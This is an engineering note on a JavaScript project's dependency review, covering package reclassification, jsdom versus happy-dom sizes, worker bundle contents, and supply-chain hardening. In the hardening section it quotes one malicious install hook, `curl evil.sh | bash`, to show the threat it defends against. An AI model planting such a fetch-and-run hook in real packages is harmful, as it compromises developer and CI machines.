# Dependency review — actions taken

Origin: dependency-review write-up identifying low-effort wins in
`package.json` categorization and node_modules bulk.

## Landed

### `vite` and `ws` reclassified as devDependencies

Both are only reachable from `src/server/dev-server.ts` (local dev
loop) and `vite build` (build script). The Cloudflare worker bundle
is the *output* of Vite, not a consumer; the worker uses platform
WebSocket / WebSocketPair, not the `ws` package.

Effect:

| Install mode    | Before | After |
|-----------------|--------|-------|
| `npm install`              | 125 MB | 125 MB |
| `npm install --omit=dev`   |  45 MB |  24 MB |

47% smaller production install. No change to deployed artifact.

## Investigated, not landed

### happy-dom replacement for jsdom

The review estimated happy-dom at ~2 MB and jsdom at 8.3 MB. Actual
install size of happy-dom is **17 MB** (it ships both `lib/` and
`src/`). Trying happy-dom across all four UI test files
(`block-ui`, `chat-ui-components`, `client-framework`,
`catalog-ui-components`) — every test passed including the
HTMLDialogElement edge cases. Functionally it's a drop-in.

But net change would be `-jsdom 8.3 MB + happy-dom 17 MB = +8.7 MB`
on disk. Reverted. Stay on jsdom until happy-dom slims down (or
upstream provides a `lib/`-only build).

### Worker bundle composition

Ran `wrangler deploy --dry-run --outdir /tmp/woo-worker-dryrun`:

- Total upload: **1800.88 KiB** (1.76 MiB)
- Gzipped: **361.66 KiB**
- Lines: 43856

Searched the bundle for `express`, `body-parser`, `cors\b` — 11
matches, all false positives (WooDSL keywords like "expression",
"regularExpression", inline catalog source text). MCP SDK
transitives (`express`, `body-parser`, `cors`, full hono surface)
do NOT reach the deployed worker; Vite/rollup tree-shake correctly
through `WebStandardStreamableHTTPServerTransport`. Leave the SDK
alone.

## Supply-chain hardening (separate from size)

### `.npmrc` with `ignore-scripts=true`

Refuses to run any package's install-lifecycle scripts on
`npm install` / `npm ci`. A compromised npm publisher token can no
longer ship `postinstall: curl evil.sh | bash` and have it execute
on developer laptops or CI runners. Pre-deployment scan of the woo
tree confirmed the only install-time script that runs today is
`esbuild`'s `postinstall: node install.js`, which is integrity
verification — the platform binary lives inside
`@esbuild/<platform>` as a plain file install. Tested: with
ignore-scripts on, `npm ci` → `vite build` → `vitest run` all
pass; no rebuild step needed. If a future dep needs its scripts,
the explicit escape hatch is
`npm rebuild --ignore-scripts=false <pkg>`.

### `npm audit signatures` in CI

Added to the existing `audit` job in `.github/workflows/ci.yml`,
runs on every PR alongside `npm audit --audit-level=moderate`.
Verifies that every package in the lockfile has a signed publish
attestation from its publisher. Baseline at landing: 190/190
registry signatures verified, 46 attestations verified. Cheap
(~2s) and catches the shai-hulud class of supply-chain attacks
where a hijacked publish token ships an unattested malicious
version.

## Not touched

- **Playwright** (15 MB devDep, one e2e test): keep. Right tool for
  the regression catcher.
- **`overrides` block**: pins `ip-address ^10.1.1`, `fast-uri ^3.1.2`
  through MCP SDK transitives. Security pins. Revisit quarterly.
- **MCP SDK itself**: dominant install cost but no replacement
  exists. Transitive bloat doesn't reach the deployed artifact.
  Filing an upstream issue to split transports into subpackages
  would remove ~70 of the 89 production transitives — the only
  surgical move that meaningfully cuts the SDK's surface.
